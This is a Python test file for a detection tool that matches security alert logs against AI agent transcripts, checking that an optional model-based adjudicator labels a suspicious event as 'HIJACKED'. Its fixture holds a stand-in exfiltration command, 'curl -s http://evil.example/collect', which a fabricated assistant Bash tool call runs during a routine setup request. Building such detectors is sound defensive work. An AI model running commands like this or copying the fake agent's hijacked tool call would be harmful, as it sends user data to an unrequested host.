"""The --model flag wires the tier-4 adjudicator into a scan. Stubbed backend, no Ollama needed."""

import csv
import io
import json

from alibi import model_tier as mt
from alibi.cli import main

SEP = " \u00a6 "
CMD = "curl -s http://evil.example/collect"


def _write(tmp_path, command=CMD):
    csv_path, tx = tmp_path / "results.csv", tmp_path / "s.jsonl"
    with open(csv_path, "w", encoding="utf-8", newline="") as f:
        w = csv.writer(f, quoting=csv.QUOTE_ALL)
        w.writerow(["Timestamp", "RuleTitle", "Level", "Computer", "Channel", "EventID",
                    "RecordID", "Details", "ExtraFieldInfo", "RuleID"])
        w.writerow(["2026-10-16 18:00:04.000 +00:00", "Net Conn (Sysmon Alert)", "high", "PC",
                    "Sysmon", "3", "1",
                    SEP.join([f"Cmdline: {command}", r"Proc: C:\Windows\System32\curl.exe", "PID: 100"]),
                    "-", "r1"])
    recs = [
        {"type": "user", "timestamp": "2026-10-16T18:00:00.000Z", "cwd": r"C:\proj",
         "message": {"role": "user", "content": "set up the project"}, "origin": {"kind": "human"}},
        {"type": "assistant", "timestamp": "2026-10-16T18:00:03.000Z", "cwd": r"C:\proj",
         "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "b1", "name": "Bash", "input": {"command": command}}]}},
        {"type": "user", "timestamp": "2026-10-16T18:00:06.000Z", "cwd": r"C:\proj",
         "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "b1", "content": "ok"}]}},
    ]
    with open(tx, "w", encoding="utf-8") as f:
        for r in recs:
            f.write(json.dumps(r) + "\n")
    return csv_path, tx


def _run(csv_path, tx, *flags):
    out = io.StringIO()
    code = main(["scan", str(csv_path), str(tx), "--json", "--all", *flags], out, io.StringIO())
    return code, [json.loads(l) for l in out.getvalue().splitlines() if l.strip()]


def test_without_model_flag_stays_unknown(tmp_path):
    code, records = _run(*_write(tmp_path))
    labels = [r["label"] for r in records]
    assert "UNKNOWN" in labels and "HIJACKED" not in labels
    assert code == 0


def test_model_flag_adjudicates_unknown(tmp_path, monkeypatch):
    monkeypatch.setattr(mt.OllamaBackend, "complete",
                        lambda self, prompt: '{"verdict":"HIJACKED","confidence":0.8,"reason":"contacts an unrequested host"}')
    code, records = _run(*_write(tmp_path), "--model", "llama3.1:8b")
    hijacks = [r for r in records if r["label"] == "HIJACKED"]
    assert hijacks and hijacks[0]["tier"] == "MODEL"
    assert code == 1
